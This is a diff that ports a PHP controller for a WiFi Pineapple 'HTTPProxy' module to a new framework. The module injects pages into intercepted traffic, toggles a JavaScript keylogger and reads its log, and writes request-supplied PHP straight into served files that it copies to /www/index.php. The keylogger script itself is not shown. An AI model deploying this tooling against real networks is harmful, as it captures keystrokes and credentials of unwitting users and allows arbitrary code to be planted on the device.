@@ -1,68 +1,11 @@
-<?php namespace pineapple;
+<?php namespace frieren\core;
 
-class HTTPProxy extends Module
+/* Code modified by Frieren Auto Refactor */
+class HTTPProxy extends Controller
 {
 
 
-    // CONSTANTS
-
-    public function route()
-    {
-
-        switch ($this->request->action) {
-
-            case 'Start':
-            $this->start();
-            break;
-
-            case 'Stop':
-            $this->stop();
-            break;
-
-            case 'save':
-            $this->saveHTML($this->request->htmlvalue);
-            break;
-
-            case 'getHtml':
-            $this->GetHtml();
-            break;
-
-            case 'viewResponsePage':
-            $this->viewResponsePage();
-            break;
-
-            case 'updateResponsePage':
-            $this->updateResponsePage($this->request->phpCode);
-            break;
-
-            case 'viewLog':
-            $this->viewLog();
-            break;
-
-            case 'enableKeyLogger':
-            $this->enableKeyLogger();
-            break;
-
-            case 'disableKeyLogger':
-            $this->disableKeyLogger();
-            break;
-
-            case 'viewKeyLoggerLog':
-            $this->viewKeyLoggerLog();
-            break;
-
-            case 'viewHTTPProxyHandler':
-            $this->viewHTTPProxyHandler();
-            break;
-
-            case 'updateHTTPProxyHandlerPage':
-            $this->updateHTTPProxyHandlerPage($this->request->HTTPProxyHandlerCode);
-            break;
-
-
-        }
-    }
-
+    protected $endpointRoutes = ['start', 'stop', 'save', 'getHtml', 'viewResponsePage', 'updateResponsePage', 'viewLog', 'enableKeyLogger', 'disableKeyLogger', 'viewKeyLoggerLog', 'viewHTTPProxyHandler', 'updateHTTPProxyHandlerPage'];
 
 
 
@@ -91,7 +34,7 @@ class HTTPProxy extends Module
 
         }
 
-            $this->response = $message ;
+            $this->responseHandler->setData($message) ;
      }
 
          public function stop(){
@@ -116,10 +59,13 @@ class HTTPProxy extends Module
                 "control_message" => $message
             );*/
 
-              $this->response = $message ;
+              $this->responseHandler->setData($message) ;
 
          }
 
+    public function save($html){
+        $this->saveHTML($this->request['htmlvalue']);
+    }
 
         public function saveHTML($html){
 
@@ -129,10 +75,10 @@ class HTTPProxy extends Module
         if($out>0){
 
 
-         $this->response = "Saved!";
+         $this->responseHandler->setData("Saved!");
         }
         else{
-         $this->response = "Error.Not Saved!";
+         $this->responseHandler->setData("Error.Not Saved!");
         }
 
         }
@@ -178,27 +124,27 @@ class HTTPProxy extends Module
     {
         $htmlFile = fopen("/pineapple/modules/HTTPProxy/assets/HTML/htmlFile.txt", "r") ;
         $HTTPProxy=fread($htmlFile,10000);
-        $this->response = $HTTPProxy;
+        $this->responseHandler->setData($HTTPProxy);
       }
 
      public function viewResponsePage(){
 
        $phpCode = fopen("/pineapple/modules/HTTPProxy/assets/response/responsePage.php", "r") ;
        $phpCode=fread($phpCode,10000);
-       $this->response = $phpCode;
+       $this->responseHandler->setData($phpCode);
 
       }
 
-      public function updateResponsePage($phpCode){
+      public function updateResponsePage(){
 
        $phpFile = fopen("/pineapple/modules/HTTPProxy/assets/response/responsePage.php", "w") ;
-       $out=fwrite($phpFile, $phpCode);
+       $out=fwrite($phpFile, $this->request['phpCode']);
        fclose($phpFile);
         if($out>0){
-        $this->response = "Saved!";
+        $this->responseHandler->setData("Saved!");
         }
         else{
-         $this->response = "Error.Not Saved!";
+         $this->responseHandler->setData("Error.Not Saved!");
         }
 
 
@@ -209,10 +155,10 @@ class HTTPProxy extends Module
         $logFile = fopen("/pineapple/modules/HTTPProxy/assets/logFile.txt", "r") ;
         $logFile=fread($logFile,10000);
         if($logFile!=""){
-         $this->response = $logFile;
+         $this->responseHandler->setData($logFile);
          }
          else{
-             $this->response="Empty Logs!";
+             $this->responseHandler->setData("Empty Logs!");
          }
 
       }
@@ -240,7 +186,7 @@ class HTTPProxy extends Module
         ";
 
         $this->saveHTML($keyLoggerJavaScript);
-         $this->response =$keyLoggerJavaScript;
+         $this->responseHandler->setData($keyLoggerJavaScript);
 
       }
 
@@ -272,7 +218,7 @@ class HTTPProxy extends Module
         ";
 
         $this->saveHTML($normalHTML);
-        $this->response =$normalHTML;
+        $this->responseHandler->setData($normalHTML);
 
 
 }
@@ -284,10 +230,10 @@ class HTTPProxy extends Module
           $logFile=fread($logFile,1000);
 
             if($logFile!=""){
-         $this->response = $logFile;
+         $this->responseHandler->setData($logFile);
          }
          else{
-             $this->response="Empty Logs!";
+             $this->responseHandler->setData("Empty Logs!");
          }
 
 
@@ -314,23 +260,23 @@ class HTTPProxy extends Module
 
            $viewHTTPProxyHandlerCode = fopen("/pineapple/modules/HTTPProxy/assets/index/index.php", "r") ;
            $viewHTTPProxyHandlerCode=fread($viewHTTPProxyHandlerCode,10000);
-           $this->response = $viewHTTPProxyHandlerCode;
+           $this->responseHandler->setData($viewHTTPProxyHandlerCode);
           }
 
 
 
-       public function updateHTTPProxyHandlerPage($HTTPProxyHandlerCode){
+       public function updateHTTPProxyHandlerPage(){
 
        $phpFile = fopen("/pineapple/modules/HTTPProxy/assets/index/index.php", "w") ;
-       $out=fwrite($phpFile, $HTTPProxyHandlerCode);
+       $out=fwrite($phpFile, $this->request['HTTPProxyHandlerCode']);
        fclose($phpFile);
         if($out>0){
-        $this->response = "Saved!";
+        $this->responseHandler->setData("Saved!");
 
         exec("cp /pineapple/modules/HTTPProxy/assets/index/index.php  /www/index.php") ;
         }
         else{
-         $this->response = "Error.Not Saved!";
+         $this->responseHandler->setData("Error.Not Saved!");
         }
 
 
